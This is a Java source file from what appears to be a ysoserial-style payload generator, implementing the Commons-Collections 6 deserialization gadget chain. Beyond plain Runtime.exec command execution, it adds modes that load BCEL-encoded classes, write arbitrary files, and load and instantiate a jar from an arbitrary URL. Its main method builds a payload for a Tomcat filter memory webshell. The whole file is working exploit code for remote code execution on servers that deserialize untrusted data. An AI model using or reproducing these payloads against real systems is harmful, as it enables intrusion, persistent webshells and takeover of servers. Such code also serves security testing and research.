package ys.payloads;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Decoder;
import ys.payloads.annotation.Authors;
import ys.payloads.annotation.Dependencies;
import ys.payloads.util.CommonUtil;
import ys.payloads.util.PayloadRunner;
import ys.payloads.util.Reflections;

import java.io.FileOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {

        final String[] execArgs = new String[] { command };

        Transformer[] transformers = null;
        if(command.toLowerCase().startsWith("sleep:")) {
            int time = Integer.valueOf(command.substring(6)) * 1000;
            transformers = new Transformer[]{
                    new ConstantTransformer(Thread.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"sleep", new Class[]{long.class}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{(long) time}}),
            };
        }else if(command.toLowerCase().startsWith("bcel:")){
            String bcelStr = command.substring(5);
            transformers = new Transformer[]{
                    new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                    new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                    new ConstantTransformer(Integer.valueOf(1))
            };
        } else if(command.toLowerCase().startsWith("bcelclass:")) {
            String bcelClass = command.substring(10);
            byte[] byteCode = CommonUtil.getFileBytes(bcelClass);
            String bcelStr = "$$BCEL$$" + Utility.encode(byteCode, true);
            System.out.println(bcelStr);
            transformers = new Transformer[]{
                    new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                    new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                    new ConstantTransformer(Integer.valueOf(1))
            };
        } else if (command.toLowerCase().startsWith("uploadbase64:")){
            String tmp = command.substring(13);
            String fileName = tmp.split("@")[0] ;
            String fileBase64Content = tmp.split("@")[1];
            byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
            transformers = new Transformer[]{
                    new ConstantTransformer(FileOutputStream.class),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{fileName}}),
                    new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}),
                    new ConstantTransformer(Integer.valueOf(1))
            };
        } else if(command.toLowerCase().startsWith("uploadfile:")){
            String tmp = command.substring(7);
            String fileName = tmp.split("@")[0] ;
            String filePath = tmp.split("@")[1];
            byte[] fileContent = CommonUtil.getFileBytes(filePath);
            transformers = new Transformer[]{
                    new ConstantTransformer(FileOutputStream.class),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{fileName}}),
                    new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}),
                    new ConstantTransformer(Integer.valueOf(1))
            };
        } else if(command.toLowerCase().startsWith("loadjar:")){
            String tmp = command.substring(8);
            String jarPath = tmp.split("@")[0];
            String className = tmp.split("@")[1];
            transformers = new Transformer[]{
                    new ConstantTransformer(URLClassLoader.class),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(jarPath)}}}),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                    new InvokerTransformer("newInstance",new Class[0],new Object[0]),
                    new ConstantTransformer(Integer.valueOf(1))
            };
        } else {
            transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, execArgs),
                    new ConstantTransformer(1) };
        }

        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        return map;
    }

    public static void main(final String[] args) throws Exception {
        //PayloadRunner.run(CommonsCollections6.class, args);
        Object objPayload = new  CommonsCollections6().getObject("bcelclass:/Users/c0ny1/Documents/dubbo-rce/JettyMemshell/Tomcat5FilterMemshell/src/Tomcat5FilterMemshellLoader.class");
        //new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("file:///")}).loadClass("").newInstance();
        //Object objPayload =new CommonsCollections6().getObject("loadjar:file:////Users/c0ny1/Documents/dubbo-rce/JettyMemshell/out/artifacts/Tomcat5FilterMemshell_jar/Tomcat5FilterMemshell.jar@Test");
        //Object objPayload =new CommonsCollections6().getObject("upload:a.jar@/Users/c0ny1/Documents/dubbo-rce/JettyMemshell/out/artifacts/Tomcat5FilterMemshell_jar/Tomcat5FilterMemshell.jar");
        //Deserializer.deserialize(Serializer.serialize(objPayload));
    }
}
